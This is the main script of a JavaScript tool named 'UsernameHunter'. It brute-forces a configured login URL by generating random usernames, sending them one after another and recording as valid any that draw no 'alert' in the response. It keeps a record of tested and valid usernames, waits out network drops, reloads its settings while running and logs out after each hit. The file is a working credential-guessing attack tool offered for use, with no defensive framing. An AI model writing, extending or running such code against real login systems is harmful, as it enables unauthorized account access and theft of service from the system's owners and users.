import fs from 'fs';
import { CONFIG_FILE, loadConfig } from './src/config.js';
import { generateUsername } from './src/generator.js';
import { sendRequest, logout, checkServerConnection } from './src/requester.js';
import { log } from './src/logger.js';

const TOOL_NAME = "UsernameHunter";

let config = loadConfig();
let lastModified = fs.statSync(CONFIG_FILE).mtimeMs;

let {
    url, logout_url, method = "POST", length,
    digits, prefix, suffix, count
} = config;

let randomPartLength = length - prefix.length - suffix.length;
let tested = new Set();

if (fs.existsSync('tested_usernames.txt')) {
    const oldTested = fs.readFileSync('tested_usernames.txt', 'utf-8')
        .split(/\r?\n/)
        .filter(Boolean);
    oldTested.forEach(username => tested.add(username));
}

let i = 0;

log.header(TOOL_NAME);
log.warn(`Target: ${url}`);
log.warn(`Method: ${method}`);
log.warn(`Usernames to Test: ${count}`);
log.warn(`Username Format: ${prefix}[random]${suffix}`);
log.warn(`Random Length: ${randomPartLength}`);
log.info("=".repeat(50));

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

(async function run() {
    for (let _ = 0; _ < count; _++) {
        let serverOnline = await checkServerConnection(url);
        while (!serverOnline) {
            log.success("[+] wait for connect please check from Network");
            await delay(5000);
            serverOnline = await checkServerConnection(url);
        }

        const newModified = fs.statSync(CONFIG_FILE).mtimeMs;
        if (newModified !== lastModified) {
            log.warn("[*] Detected change in config.json, reloading...");
            config = loadConfig();
            ({ url, logout_url, method, length, digits, prefix, suffix, count } = config);
            randomPartLength = length - prefix.length - suffix.length;
            lastModified = newModified;
            log.info("[+] New settings applied!");
        }

        let username = generateUsername({ prefix, suffix, digits, randomPartLength });
        if (tested.has(username)) continue;
        tested.add(username);
        fs.appendFileSync("tested_usernames.txt", username + "\n");
        i++;

        log.debug(`[DEBUG] ${username} Number #${i}`);
        const start = Date.now();

        try {
            let response = await sendRequest({ url, method, username });
            if (!response) continue;

            if (response.data.includes("alert")) {
                log.error(`[-] Invalid: ${username}`);
            } else {
                log.success(`[+] Valid username: ${username}`);
                const now = new Date().toLocaleString();
                fs.appendFileSync("valid_usernames.txt", `${username} - Time: ${now}\n`);

                if (logout_url) {
                    await logout(logout_url, username);
                }
            }

            const end = Date.now();
            log.gray(`Token Time ${end - start}`);
        } catch (err) {
            log.error(`[!] Request failed for ${username}: ${err.message}`);
        }

        // await delay(100); // optional
    }

    log.info("\n[*] Done.");
})();

